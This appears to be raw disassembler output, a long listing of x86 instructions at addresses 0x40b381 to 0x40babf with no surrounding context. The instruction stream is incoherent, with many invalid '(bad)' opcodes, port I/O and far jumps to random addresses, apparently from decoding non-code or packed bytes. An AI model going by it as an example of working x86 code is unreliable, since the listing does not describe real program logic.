  40b381:	mov    bh,0xf9
  40b383:	xchg   esi,eax
  40b384:	mov    ah,0xa0
  40b386:	ins    DWORD PTR es:[edi],dx
  40b387:	and    ch,BYTE PTR [esi+0x5d]
  40b38a:	in     eax,0xeb
  40b38c:	test   BYTE PTR [ebp+0x5ca43ce7],bh
  40b392:	pop    ss
  40b393:	dec    esp
  40b394:	sub    DWORD PTR [edi+0x34],esp
  40b397:	test   edi,ecx
  40b399:	push   eax
  40b39a:	or     ah,BYTE PTR [eax]
  40b39c:	ja     0x40b334
  40b39e:	mov    ecx,0x9c52e27e
  40b3a3:	dec    esi
  40b3a4:	test   eax,0xfb5c71f8
  40b3a9:	mov    ecx,0xecda06a7
  40b3ae:	dec    ebp
  40b3af:	lea    esi,[esp+ecx*2]
  40b3b2:	push   cs
  40b3b3:	lods   eax,DWORD PTR ds:[esi]
  40b3b4:	(bad)
  40b3b8:	repz loop 0x40b41c
  40b3bb:	or     al,0x7b
  40b3bd:	mov    esi,0xf4edbf1f
  40b3c2:	mov    edx,0x4e5cdadb
  40b3c7:	inc    esp
  40b3c8:	xchg   ecx,eax
  40b3c9:	test   DWORD PTR [edi],edx
  40b3cb:	or     edx,eax
  40b3cd:	push   0x4259377a
  40b3d2:	mov    ebx,DWORD PTR [ebp-0x47d42b62]
  40b3d8:	jno    0x40b3f7
  40b3da:	adc    BYTE PTR [esi-0x3b08ef],bl
  40b3e0:	icebp  
  40b3e1:	pusha  
  40b3e2:	(bad)  [edx]
  40b3e4:	pop    es
  40b3e5:	or     esi,DWORD PTR [edx]
  40b3e7:	mov    ch,0x2d
  40b3e9:	push   edx
  40b3ea:	fldcw  WORD PTR [edx+0x17]
  40b3ed:	popa   
  40b3ee:	scas   al,BYTE PTR es:[edi]
  40b3ef:	stos   DWORD PTR es:[edi],eax
  40b3f0:	int    0x10
  40b3f2:	sub    edx,DWORD PTR [esi-0x44]
  40b3f5:	sbb    al,0xc0
  40b3f7:	add    ebx,DWORD PTR ds:0xae36d553
  40b3fd:	shl    DWORD PTR ds:0x2aa3900,cl
  40b403:	fs ins DWORD PTR es:[edi],dx
  40b405:	fist   WORD PTR [eax-0x41]
  40b408:	pop    ss
  40b409:	addr16 cdq 
  40b40b:	add    edi,esi
  40b40d:	out    dx,al
  40b40e:	jl     0x40b3f5
  40b410:	adc    ecx,DWORD PTR [eax+edx*4+0x56]
  40b414:	fld    QWORD PTR [edi]
  40b416:	ret    0x3541
  40b419:	fwait
  40b41a:	xor    ebp,DWORD PTR [ebx-0x44]
  40b41d:	xchg   esi,eax
  40b41e:	or     edi,DWORD PTR [edx+0x1a]
  40b421:	sbb    dl,al
  40b423:	push   edx
  40b424:	outs   dx,BYTE PTR ds:[esi]
  40b425:	scas   al,BYTE PTR es:[edi]
  40b426:	ins    DWORD PTR es:[edi],dx
  40b427:	addr16 dec ecx
  40b429:	jmp    0xfb25:0x9894fb25
  40b430:	or     esp,DWORD PTR [esi+0x42]
  40b433:	push   ds
  40b434:	dec    eax
  40b435:	loop   0x40b3d5
  40b437:	jmp    0xd13e:0xd3d4150b
  40b43e:	nop
  40b43f:	jb     0x40b45c
  40b441:	adc    ah,bh
  40b443:	call   0xe4a0:0x78663e
  40b44a:	cld    
  40b44b:	xchg   esi,eax
  40b44c:	psubusb mm4,QWORD PTR ds:0x123c9451
  40b453:	cmp    DWORD PTR [eax+0x2f51de8b],ecx
  40b459:	pop    edi
  40b45a:	mov    ah,0x28
  40b45c:	mov    eax,ds:0x64fb689e
  40b461:	mov    ds:0x5308e7e6,al
  40b466:	jge    0x40b45d
  40b468:	into   
  40b469:	jae    0x40b412
  40b46b:	sbb    DWORD PTR [ecx-0x1d],ebp
  40b46e:	jns    0x40b444
  40b470:	and    ebx,DWORD PTR [eax*1+0x1db5f30]
  40b477:	push   esp
  40b478:	inc    esp
  40b479:	(bad)  
  40b47a:	cld    
  40b47b:	inc    ecx
  40b47c:	in     eax,0x96
  40b47e:	sbb    ebx,edx
  40b480:	mov    bh,0x2e
  40b482:	mov    esi,0x935dee23
  40b487:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b488:	fcomp  QWORD PTR [ecx-0x2b42e90f]
  40b48e:	xchg   BYTE PTR [ebx-0x15],bh
  40b491:	xchg   edi,eax
  40b492:	and    esp,0xe9d080ab
  40b498:	aas    
  40b499:	aaa    
  40b49a:	mov    bh,0xd
  40b49c:	xchg   edx,eax
  40b49d:	scas   al,BYTE PTR es:[edi]
  40b49e:	rcl    BYTE PTR [ebx],1
  40b4a0:	cmp    al,0xcf
  40b4a2:	or     eax,0xfbc4bd1a
  40b4a7:	sbb    al,0x4e
  40b4a9:	popa   
  40b4aa:	jmp    0xade963d2
  40b4af:	pusha  
  40b4b0:	and    eax,0x2426b563
  40b4b5:	lea    eax,[ecx]
  40b4b7:	adc    BYTE PTR [ecx],ch
  40b4b9:	push   eax
  40b4ba:	imul   esp,DWORD PTR [ecx+0x70],0xffffffca
  40b4be:	in     eax,dx
  40b4bf:	fsubr  QWORD PTR [esi-0x38]
  40b4c2:	out    dx,al
  40b4c3:	inc    ecx
  40b4c4:	rcr    BYTE PTR [ecx],cl
  40b4c6:	in     eax,0x73
  40b4c8:	xor    BYTE PTR [edx-0x58],ch
  40b4cb:	or     eax,0xc7decc02
  40b4d0:	xlat   BYTE PTR ss:[ebx]
  40b4d2:	sub    bh,ah
  40b4d4:	inc    esi
  40b4d5:	push   cs
  40b4d6:	ins    BYTE PTR es:[edi],dx
  40b4d7:	daa    
  40b4d8:	dec    edi
  40b4d9:	dec    edi
  40b4da:	xchg   esp,eax
  40b4db:	sbb    ebx,ecx
  40b4dd:	cmp    DWORD PTR [ecx+0x5a],0xffffffca
  40b4e1:	mov    edi,DWORD PTR [eax+eiz*4-0x42]
  40b4e5:	inc    ebp
  40b4e6:	sar    BYTE PTR [edx+0x3795348b],cl
  40b4ec:	lahf   
  40b4ed:	sbb    al,0x5b
  40b4ef:	xchg   edi,eax
  40b4f0:	mov    DWORD PTR [ebp+0x2eaf2967],0x65dd3603
  40b4fa:	dec    ebx
  40b4fb:	les    esp,FWORD PTR [edx+esi*4-0x78]
  40b4ff:	add    BYTE PTR [ebp+0x451d6877],al
  40b505:	test   BYTE PTR [edx+0x32bc5b09],dl
  40b50b:	xchg   al,cl
  40b50d:	lods   eax,DWORD PTR ds:[esi]
  40b50e:	or     ax,0xc42a
  40b512:	mov    al,0x2
  40b514:	in     eax,dx
  40b515:	mov    esp,0x5f4783da
  40b51a:	cwde   
  40b51b:	mov    cl,0x87
  40b51d:	pop    esi
  40b51e:	jg     0x40b4c9
  40b520:	add    bl,BYTE PTR [eax-0x3c168573]
  40b526:	les    esp,FWORD PTR [esi-0x43]
  40b529:	scas   al,BYTE PTR es:[edi]
  40b52a:	pop    edx
  40b52b:	pushf  
  40b52c:	test   BYTE PTR [ebx+0x1b2ad6b],dh
  40b532:	jbe    0x40b55c
  40b534:	xchg   esp,eax
  40b535:	jp     0x40b53c
  40b537:	stos   BYTE PTR es:[edi],al
  40b538:	xchg   edx,eax
  40b539:	xchg   edi,eax
  40b53a:	inc    esp
  40b53b:	lea    edx,[edi+ecx*8+0x28]
  40b53f:	or     DWORD PTR ds:0xe6422e91,0x26
  40b546:	add    eax,0xa77ec2c2
  40b54b:	xchg   edi,eax
  40b54c:	push   ebx
  40b54d:	mov    esp,0xc2131615
  40b552:	sbb    esp,ecx
  40b554:	sub    dl,al
  40b556:	xor    ecx,DWORD PTR [esi]
  40b558:	fadd   st,st(5)
  40b55a:	in     al,dx
  40b55b:	mov    ?,edx
  40b55d:	xchg   ebp,eax
  40b55e:	call   0xfc4d:0x491d50c
  40b565:	and    DWORD PTR [ecx],ecx
  40b567:	out    0xee,eax
  40b569:	pop    es
  40b56a:	xchg   edi,eax
  40b56b:	pop    ebx
  40b56c:	xor    DWORD PTR [ebx-0x48],esi
  40b56f:	jmp    0x40b596
  40b571:	adc    eax,0x1817bbfe
  40b576:	xor    eax,0x455ae572
  40b57b:	inc    esi
  40b57c:	test   esi,esp
  40b57e:	imul   esp,DWORD PTR [edx+0x78391505],0x6e
  40b585:	push   edi
  40b586:	clc    
  40b587:	into   
  40b588:	std    
  40b589:	xchg   esp,eax
  40b58a:	(bad)  
  40b58b:	into   
  40b58c:	push   edi
  40b58d:	into   
  40b58e:	inc    edx
  40b58f:	aaa    
  40b590:	push   esp
  40b591:	cmp    ecx,0x1f
  40b594:	adc    bh,ah
  40b596:	shl    DWORD PTR [ebp-0x41b050ba],cl
  40b59c:	fimul  WORD PTR [ebp+0x40]
  40b59f:	xor    DWORD PTR [eax],ecx
  40b5a1:	bound  eax,QWORD PTR [ebx+esi*1+0x5e]
  40b5a5:	lea    eax,[ebp-0x56]
  40b5a8:	push   edx
  40b5a9:	int3   
  40b5aa:	push   ebx
  40b5ab:	cld    
  40b5ac:	and    ebp,DWORD PTR [eax-0x243ee99d]
  40b5b2:	outs   dx,BYTE PTR ds:[esi]
  40b5b3:	div    BYTE PTR [ebp+0x274d2ea9]
  40b5b9:	sbb    cl,0xac
  40b5bc:	add    eax,0x83300353
  40b5c1:	mov    es,WORD PTR fs:[esi+0x12c3027c]
  40b5c8:	cmp    cl,BYTE PTR [ecx-0x12]
  40b5cb:	out    0x39,al
  40b5cd:	loop   0x40b595
  40b5cf:	shr    BYTE PTR [esi+0x3c0dd93a],cl
  40b5d5:	lds    esp,FWORD PTR [ebx+0x4]
  40b5d8:	mov    dl,0x69
  40b5da:	xchg   ebp,eax
  40b5db:	pop    ebx
  40b5dc:	in     eax,0xaa
  40b5de:	jmp    0xb949479c
  40b5e3:	popa   
  40b5e4:	push   0x686defb4
  40b5e9:	rcr    DWORD PTR [esi+edi*8],cl
  40b5ec:	xchg   esp,eax
  40b5ed:	(bad)  
  40b5ee:	arpl   WORD PTR [ebx],ax
  40b5f0:	loopne 0x40b62e
  40b5f2:	adc    DWORD PTR [ebx+ecx*1-0x67b0a46e],esp
  40b5f9:	stos   BYTE PTR es:[edi],al
  40b5fa:	mov    eax,ds:0x3c82734f
  40b5ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b600:	in     eax,0x86
  40b602:	and    dh,BYTE PTR [esi+0x62]
  40b605:	sti    
  40b606:	sbb    bl,ch
  40b608:	icebp  
  40b609:	nop
  40b60a:	add    ebp,esp
  40b60c:	xchg   edx,eax
  40b60d:	add    ecx,DWORD PTR [edi]
  40b60f:	dec    ebp
  40b610:	mov    ebx,0xdcb6c250
  40b615:	adc    dl,dh
  40b617:	(bad)  [ecx]
  40b619:	push   ds
  40b61a:	dec    ecx
  40b61b:	mov    al,0x53
  40b61d:	das    
  40b61e:	mov    bh,0x24
  40b621:	xor    ecx,edx
  40b623:	rol    BYTE PTR [edi+esi*8+0x11798929],0x9d
  40b62b:	jne    0x40b680
  40b62d:	bound  edi,QWORD PTR [eax+0x4]
  40b630:	mov    ah,0x76
  40b632:	ret    
  40b633:	sbb    DWORD PTR [eax+0x75125f08],0x1975f3a9
  40b63d:	ins    BYTE PTR es:[edi],dx
  40b63e:	mov    ch,0x70
  40b640:	aam    0x94
  40b642:	popf   
  40b643:	push   0xf3caa5c1
  40b648:	scas   eax,DWORD PTR es:[edi]
  40b649:	sti    
  40b64a:	aas    
  40b64b:	xchg   edi,eax
  40b64c:	pop    esp
  40b64d:	in     al,0x16
  40b64f:	cli    
  40b650:	xor    DWORD PTR [esi],ebx
  40b652:	fnstcw WORD PTR [esi-0x15]
  40b655:	mov    esp,0x6d81285a
  40b65a:	xor    DWORD PTR [esp+ebx*1],0x14886fd1
  40b661:	adc    eax,0x984404a8
  40b666:	pushf  
  40b667:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b668:	cmp    dh,BYTE PTR [edi]
  40b66a:	dec    eax
  40b66b:	call   0xf244de66
  40b670:	mov    al,ds:0xb5f5e0a8
  40b675:	pop    ebx
  40b676:	data16 mov ch,0xc
  40b679:	pop    esi
  40b67a:	addr16 mov ah,0xa3
  40b67d:	adc    edx,DWORD PTR [eax+0x7e]
  40b680:	xchg   edi,eax
  40b681:	jp     0x40b60c
  40b683:	sbb    DWORD PTR [ebx-0x47fb954e],esi
  40b689:	(bad)  
  40b68a:	adc    eax,0x8d01cf7b
  40b68f:	or     esp,esp
  40b691:	xchg   ebx,eax
  40b692:	sub    ch,bl
  40b694:	xchg   edx,eax
  40b695:	cmp    ebp,DWORD PTR [ebx+0x5]
  40b698:	and    DWORD PTR [esi],ebx
  40b69a:	fwait
  40b69b:	pop    edi
  40b69c:	cmp    BYTE PTR [esi+0xf],ah
  40b69f:	dec    edx
  40b6a0:	and    edi,DWORD PTR ds:0xd56be58a
  40b6a6:	add    ecx,ebp
  40b6a8:	push   esp
  40b6a9:	sti    
  40b6aa:	pop    es
  40b6ab:	fldcw  WORD PTR [ebx+0x63af6e34]
  40b6b1:	daa    
  40b6b2:	sbb    eax,0xc9b8ff83
  40b6b7:	jecxz  0x40b664
  40b6b9:	mov    ah,0x7f
  40b6bb:	xor    edi,esp
  40b6bd:	xchg   edi,eax
  40b6be:	bound  ebp,QWORD PTR [esi]
  40b6c0:	shl    ah,cl
  40b6c2:	pop    edx
  40b6c3:	and    BYTE PTR [ebx-0x73],ah
  40b6c6:	inc    ecx
  40b6c7:	sbb    esi,eax
  40b6c9:	jns    0x40b6df
  40b6cb:	in     al,dx
  40b6cc:	cmp    eax,0x313e3d7
  40b6d1:	mov    bl,0xc5
  40b6d3:	outs   dx,BYTE PTR ds:[esi]
  40b6d4:	adc    bl,BYTE PTR [esi+0x45348635]
  40b6da:	ret    
  40b6db:	add    bh,BYTE PTR [ebx+0x66]
  40b6de:	into   
  40b6df:	inc    edx
  40b6e0:	pop    ss
  40b6e1:	xchg   ebp,eax
  40b6e2:	add    eax,0xe08656e5
  40b6e7:	mov    dh,0x1d
  40b6e9:	and    DWORD PTR [edi+0x4d5c833c],esp
  40b6ef:	dec    ecx
  40b6f0:	adc    BYTE PTR [esi],ah
  40b6f2:	mov    esi,0xb14a29da
  40b6f7:	adc    BYTE PTR [ebx],bh
  40b6f9:	dec    ecx
  40b6fa:	rcl    DWORD PTR [ebx],0x67
  40b6fd:	(bad)  
  40b6fe:	add    ebx,DWORD PTR ss:[eax-0x455d05b2]
  40b705:	mov    ebp,0x3187de0
  40b70a:	out    dx,eax
  40b70b:	mov    ds:0xff5b74fb,al
  40b710:	jns    0x40b69c
  40b712:	out    dx,al
  40b713:	and    DWORD PTR [edx+0x1d5e8c20],0x8d14a6d
  40b71d:	rol    edi,0xd3
  40b720:	jbe    0x40b6ea
  40b722:	out    dx,al
  40b723:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b724:	sub    esp,DWORD PTR [esi-0xd]
  40b727:	je     0x40b735
  40b729:	ins    BYTE PTR es:[edi],dx
  40b72a:	stc    
  40b72b:	bound  eax,QWORD PTR [eax-0x39eb319c]
  40b731:	jl     0x40b7a4
  40b733:	enter  0xd162,0xfa
  40b737:	xchg   DWORD PTR [esi],ebp
  40b739:	jno    0x40b79b
  40b73b:	push   0xd2107c53
  40b740:	retf   0xbc64
  40b743:	pop    edi
  40b744:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b745:	fstp   DWORD PTR [esi]
  40b747:	mov    eax,ds:0xf2eaf9ea
  40b74c:	cmp    cl,bl
  40b74e:	mov    cs,WORD PTR [ebp+0x2d]
  40b751:	int    0xf3
  40b753:	out    dx,al
  40b754:	xor    edi,DWORD PTR [ebx+0x71]
  40b757:	mov    al,0x1b
  40b759:	or     BYTE PTR [ebx-0x67],cl
  40b75c:	lods   al,BYTE PTR ds:[esi]
  40b75d:	cmp    al,0x22
  40b75f:	mov    ?,WORD PTR [edi+0x21283179]
  40b765:	lds    esp,FWORD PTR [ebp+0xf]
  40b768:	lahf   
  40b769:	push   ebp
  40b76a:	je     0x40b715
  40b76c:	pop    ebp
  40b76d:	pop    ebp
  40b76e:	das    
  40b76f:	mov    ebx,0x1bcd1ee7
  40b774:	lock mov WORD PTR [edx+eiz*1],?
  40b778:	jbe    0x40b72e
  40b77a:	inc    eax
  40b77b:	lds    esi,FWORD PTR [ecx+eiz*4-0x3]
  40b77f:	test   eax,0xbe21626e
  40b784:	fsub   st,st(5)
  40b786:	jne    0x40b739
  40b788:	cld    
  40b789:	mov    dl,0x29
  40b78b:	lds    ebx,FWORD PTR [edi-0x5b8f23da]
  40b791:	sbb    al,0x27
  40b793:	cmp    dl,BYTE PTR [edi+edx*1-0x27f20da2]
  40b79a:	lods   eax,DWORD PTR ds:[esi]
  40b79b:	sbb    eax,0x410fed6
  40b7a0:	jb     0x40b72d
  40b7a2:	push   ebx
  40b7a3:	outs   dx,BYTE PTR ds:[esi]
  40b7a4:	adc    al,0x10
  40b7a6:	mov    dh,0xc3
  40b7a8:	sub    edi,DWORD PTR [ecx-0x61]
  40b7ab:	pushf  
  40b7ac:	out    0x33,al
  40b7ae:	pop    ss
  40b7af:	loop   0x40b79e
  40b7b1:	jns    0x40b80e
  40b7b3:	dec    edx
  40b7b4:	out    0xcd,al
  40b7b6:	aad    0x14
  40b7b8:	rcr    BYTE PTR [eax-0x74d48d3],1
  40b7be:	sub    DWORD PTR [edx-0x6],ebp
  40b7c1:	lahf   
  40b7c2:	xchg   edx,eax
  40b7c3:	adc    dl,BYTE PTR [eax+0x5c]
  40b7c6:	mov    ch,0xf8
  40b7c8:	add    ebx,edi
  40b7ca:	fs addr16 leave 
  40b7cd:	add    DWORD PTR [edx],ebx
  40b7cf:	push   edi
  40b7d0:	in     al,dx
  40b7d1:	mov    bl,BYTE PTR ds:0x539ecbb3
  40b7d7:	shr    DWORD PTR [edx],0xf
  40b7da:	sub    esi,DWORD PTR [edx]
  40b7dc:	xchg   edx,eax
  40b7dd:	cmc    
  40b7de:	pop    ebx
  40b7df:	xor    al,0xcd
  40b7e1:	mov    bh,0x7c
  40b7e3:	mov    dl,0x1f
  40b7e5:	jmp    0x40b785
  40b7e7:	inc    ebx
  40b7e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b7e9:	xlat   BYTE PTR ds:[ebx]
  40b7ea:	pop    edx
  40b7eb:	mov    ebp,0x5b8dff55
  40b7f0:	lds    edx,FWORD PTR [ecx-0x77]
  40b7f3:	out    0x50,al
  40b7f5:	push   ss
  40b7f6:	mov    dh,BYTE PTR [esi]
  40b7f8:	pop    esp
  40b7f9:	jmp    0x40b79c
  40b7fb:	sbb    eax,0xbf41e2c
  40b800:	xchg   esi,eax
  40b801:	mov    esp,0x4fd2011c
  40b806:	cmp    cl,bh
  40b808:	push   ds
  40b809:	pop    ds
  40b80a:	cmp    BYTE PTR [ebx],bl
  40b80c:	and    DWORD PTR [edx+0x3d],0x8b475266
  40b813:	stc    
  40b814:	pmaxub mm7,QWORD PTR ds:[edi]
  40b818:	sub    edx,DWORD PTR [edi+0x504e33de]
  40b81e:	and    eax,0x4bc08ee3
  40b823:	ror    esi,1
  40b825:	gs mov cl,0x44
  40b828:	or     ebp,DWORD PTR [esi+0x6c]
  40b82b:	dec    esp
  40b82c:	jns    0x40b852
  40b82e:	adc    dh,BYTE PTR [ebx-0x47e9e226]
  40b834:	sbb    cl,0x6d
  40b837:	cmp    DWORD PTR [eax-0x1a72d69c],esi
  40b83d:	pop    ecx
  40b83e:	bts    DWORD PTR [edx-0x4df67cd8],edi
  40b845:	xor    DWORD PTR [edx+0x19],ebx
  40b848:	pop    ds
  40b849:	jg     0x40b818
  40b84b:	bound  edx,QWORD PTR [esp-0x6afb7545]
  40b852:	test   BYTE PTR [ecx-0x7d98588f],ah
  40b858:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b859:	mov    bh,0xa2
  40b85b:	out    dx,al
  40b85c:	je     0x40b8ac
  40b85e:	and    eax,0x68151c71
  40b863:	icebp  
  40b864:	pop    edi
  40b865:	dec    edi
  40b866:	sbb    DWORD PTR [esi-0xc],eax
  40b869:	dec    esi
  40b86a:	(bad)  
  40b86b:	fadd   st(5),st
  40b86d:	daa    
  40b86e:	icebp  
  40b86f:	sbb    eax,0xcba61d56
  40b874:	dec    edx
  40b875:	pusha  
  40b876:	call   0x1e00:0xad473e2b
  40b87d:	data16 fstp DWORD PTR [ebx+0x596899bb]
  40b884:	jae    0x40b849
  40b886:	pusha  
  40b887:	pop    es
  40b888:	repnz in eax,0x88
  40b88b:	aas    
  40b88c:	add    al,0xa8
  40b88e:	mov    dl,0xff
  40b890:	aas    
  40b891:	ins    DWORD PTR es:[edi],dx
  40b892:	mov    al,0xef
  40b894:	xor    al,0x3d
  40b896:	out    dx,eax
  40b897:	dec    edx
  40b898:	fwait
  40b899:	mov    bh,0x7e
  40b89b:	out    dx,eax
  40b89c:	jecxz  0x40b860
  40b89e:	das    
  40b89f:	jg     0x40b90a
  40b8a1:	lods   eax,DWORD PTR ds:[esi]
  40b8a2:	shr    edi,1
  40b8a4:	pushf  
  40b8a5:	dec    DWORD PTR [esi]
  40b8a7:	jg     0x40b902
  40b8a9:	cmp    ebx,DWORD PTR [edi]
  40b8ab:	sub    BYTE PTR [edx],al
  40b8ad:	or     ebx,ebp
  40b8af:	sbb    BYTE PTR [edi],cl
  40b8b1:	sti    
  40b8b2:	call   0x73de3008
  40b8b7:	pop    edx
  40b8b8:	push   ss
  40b8b9:	cmp    esp,DWORD PTR [ebx+0x23]
  40b8bc:	adc    al,ch
  40b8be:	push   ebx
  40b8bf:	out    dx,eax
  40b8c0:	pop    ecx
  40b8c1:	aad    0x31
  40b8c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b8c4:	xor    DWORD PTR [edx+edi*2],0x5bfc0687
  40b8cb:	jp     0x40b8f2
  40b8cd:	jmp    0x40b910
  40b8cf:	xchg   ebx,eax
  40b8d0:	xor    esi,DWORD PTR [ebp+0x2f8a2fa5]
  40b8d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b8d7:	pop    esp
  40b8d8:	push   ebp
  40b8d9:	ds retf 
  40b8db:	inc    ecx
  40b8dc:	dec    ecx
  40b8dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b8de:	mov    al,0xe6
  40b8e0:	(bad)  
  40b8e1:	neg    BYTE PTR [ebx-0x2cc3152a]
  40b8e7:	jmp    0x40b8be
  40b8e9:	leave  
  40b8ea:	sub    eax,0xa1b1a332
  40b8ef:	sbb    DWORD PTR [esi+0x1c179a3a],ebx
  40b8f5:	test   BYTE PTR [esi+esi*1],cl
  40b8f8:	sub    eax,0x9700f8f7
  40b8fd:	enter  0x86d4,0xf1
  40b901:	je     0x40b931
  40b903:	mov    ebx,0x7d3baebd
  40b908:	sub    ecx,ebp
  40b90a:	mov    edx,0x84fc08eb
  40b90f:	rol    BYTE PTR [edx+0x42],0xf
  40b913:	cwde   
  40b914:	mov    ds:0x59031c92,eax
  40b919:	adc    BYTE PTR [edi+0x3cbafbf2],ah
  40b91f:	(bad)  [eax+0x5341d91d]
  40b925:	xchg   esi,eax
  40b926:	sti    
  40b927:	dec    ebp
  40b928:	mov    edx,0xc29f1b7f
  40b92d:	sahf   
  40b92e:	test   eax,0xc478ce1b
  40b933:	push   ecx
  40b934:	inc    ebx
  40b935:	xor    eax,0xeca41e25
  40b93a:	mov    ch,0x64
  40b93c:	and    al,0xbd
  40b93e:	or     BYTE PTR [esi+0x1d],0x82
  40b942:	xchg   ebx,eax
  40b943:	fsub   st(5),st
  40b945:	adc    BYTE PTR [edi],dh
  40b947:	push   es
  40b948:	adc    al,0xdb
  40b94a:	int3   
  40b94b:	xor    eax,0xe2b46d17
  40b950:	iret   
  40b951:	xor    al,0xd1
  40b953:	out    0x7d,eax
  40b955:	fisub  WORD PTR [esi+0x61]
  40b958:	into   
  40b959:	cmc    
  40b95a:	retf   
  40b95b:	cmp    al,0x7b
  40b95d:	sbb    eax,0xa58edc45
  40b962:	fiadd  DWORD PTR [ebp-0x37ca9473]
  40b968:	fs inc esp
  40b96a:	test   al,bl
  40b96c:	jo     0x40b975
  40b96e:	inc    eax
  40b96f:	xlat   BYTE PTR ds:[ebx]
  40b970:	push   es
  40b971:	imul   edx,DWORD PTR [ebx],0x31
  40b974:	inc    eax
  40b975:	mov    ebp,0x75a8e4c6
  40b97a:	xor    esi,DWORD PTR [ebx+0x37]
  40b97d:	jns    0x40b985
  40b97f:	xor    cl,ah
  40b981:	ja     0x40b9f8
  40b983:	das    
  40b984:	dec    ebp
  40b985:	mov    ebx,0xeac7de85
  40b98a:	xor    bh,ch
  40b98c:	mov    dh,0x1f
  40b98e:	push   ecx
  40b98f:	jno    0x40b965
  40b991:	xchg   ebx,eax
  40b992:	add    BYTE PTR [ecx*1+0x486d424f],bh
  40b999:	cmp    ebx,DWORD PTR ds:0x89ae0aff
  40b99f:	in     eax,0xf0
  40b9a1:	push   cs
  40b9a2:	mov    ds:0x35bdce04,eax
  40b9a7:	and    esi,0xffffffdc
  40b9aa:	ffreep st(2)
  40b9ac:	icebp  
  40b9ad:	mov    bl,BYTE PTR [esi]
  40b9af:	push   es
  40b9b0:	aam    0x8
  40b9b2:	jmp    0x40b9a3
  40b9b4:	adc    esi,DWORD PTR [ebp+0x50]
  40b9b7:	(bad)  
  40b9b8:	fild   DWORD PTR ds:0xfa655e2d
  40b9be:	adc    eax,eax
  40b9c0:	popf   
  40b9c1:	jb     0x40b95e
  40b9c3:	fdivr  st,st(1)
  40b9c5:	add    BYTE PTR [ecx+0x7c],0x5e
  40b9c9:	lods   eax,DWORD PTR ds:[esi]
  40b9ca:	fldenv [eax+eax*1+0x5e]
  40b9ce:	test   eax,0xdc1f4003
  40b9d3:	mov    ecx,0x79a77b59
  40b9d8:	out    0x28,eax
  40b9da:	sbb    al,0x65
  40b9dc:	sbb    esi,DWORD PTR ds:0x6df2d32e
  40b9e2:	mov    cl,0x28
  40b9e4:	clc    
  40b9e5:	sbb    esp,DWORD PTR [eax+0x47]
  40b9e8:	jb     0x40b99a
  40b9ea:	fstp   TBYTE PTR [edx+0x2d]
  40b9ed:	rcr    BYTE PTR [edx-0x5d723995],0x28
  40b9f4:	xor    eax,0xae17efc8
  40b9f9:	dec    edx
  40b9fa:	fld    QWORD PTR [edx+edi*1+0x2b]
  40b9fe:	sbb    ecx,DWORD PTR [edx+0x526f5e80]
  40ba04:	ins    DWORD PTR es:[edi],dx
  40ba05:	fld    QWORD PTR [ebx+eax*2+0x61d9def6]
  40ba0c:	pop    edx
  40ba0d:	jae    0x40b9ed
  40ba0f:	add    DWORD PTR [edi],ecx
  40ba11:	outs   dx,BYTE PTR ds:[esi]
  40ba12:	mov    BYTE PTR [ebx+0x12],al
  40ba15:	sar    BYTE PTR [edi-0x770cc8dc],1
  40ba1b:	mov    dl,al
  40ba1d:	(bad)  
  40ba1e:	cld    
  40ba1f:	jp     0x40ba1f
  40ba21:	mov    WORD PTR [eax+0x12],ss
  40ba24:	(bad)  
  40ba26:	stos   BYTE PTR es:[edi],al
  40ba27:	jno    0x40ba51
  40ba29:	nop
  40ba2a:	xchg   edi,eax
  40ba2b:	mov    ecx,0xce4e69f4
  40ba30:	aam    0x87
  40ba32:	cs cs pop edx
  40ba35:	les    ecx,FWORD PTR [edi+0x1]
  40ba38:	sbb    esi,DWORD PTR [eax+0x3]
  40ba3b:	sub    al,0x27
  40ba3d:	sbb    eax,0xc19bab39
  40ba42:	bound  edi,QWORD PTR [ebx+0x55]
  40ba45:	add    eax,0x908cc4be
  40ba4a:	and    edi,DWORD PTR [eax+0x68]
  40ba4d:	aam    0xcf
  40ba4f:	adc    ecx,edx
  40ba51:	aad    0x24
  40ba53:	mov    ds:0x61de973a,al
  40ba58:	scas   eax,DWORD PTR es:[edi]
  40ba59:	cmp    eax,DWORD PTR ds:0x87cf2d25
  40ba5f:	pushf  
  40ba60:	(bad)  
  40ba61:	test   al,0xe2
  40ba63:	mov    dl,0xc7
  40ba65:	or     DWORD PTR [edx+ebp*1],0xfffffffa
  40ba69:	pop    es
  40ba6a:	pop    es
  40ba6b:	dec    esp
  40ba6c:	mov    ebx,0x6173a438
  40ba71:	addr16 sahf 
  40ba73:	cli    
  40ba74:	in     eax,dx
  40ba75:	add    ch,BYTE PTR [ecx-0x169c4e9]
  40ba7b:	dec    esp
  40ba7c:	add    bl,al
  40ba7e:	or     ecx,DWORD PTR [ebp-0x76342642]
  40ba84:	(bad)  
  40ba85:	push   edi
  40ba86:	cmc    
  40ba87:	inc    ebx
  40ba88:	leave  
  40ba89:	push   edi
  40ba8a:	jg     0x40ba5a
  40ba8c:	push   esp
  40ba8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ba8e:	pop    eax
  40ba8f:	in     al,0xcb
  40ba91:	mov    edx,eax
  40ba93:	pop    ecx
  40ba94:	inc    esp
  40ba95:	loopne 0x40bb07
  40ba97:	pop    es
  40ba98:	test   al,0xf9
  40ba9a:	mov    bh,ah
  40ba9c:	enter  0x8b86,0x6e
  40baa0:	in     al,dx
  40baa1:	pop    ds
  40baa2:	mov    ch,0xe4
  40baa4:	callw  0xbc22
  40baa8:	rol    BYTE PTR [ecx+edi*1],1
  40baab:	fs out dx,eax
  40baad:	push   esi
  40baae:	stos   DWORD PTR es:[edi],eax
  40baaf:	out    dx,al
  40bab0:	loope  0x40ba6b
  40bab2:	mov    ds:0xc6f5b101,al
  40bab7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bab8:	mov    ah,0x21
  40baba:	pop    es
  40babb:	add    BYTE PTR [eax],dl
  40babd:	lods   al,BYTE PTR ds:[esi]
  40babe:	dec    ebx
  40babf:	sar    DWORD PTR [ecx],1
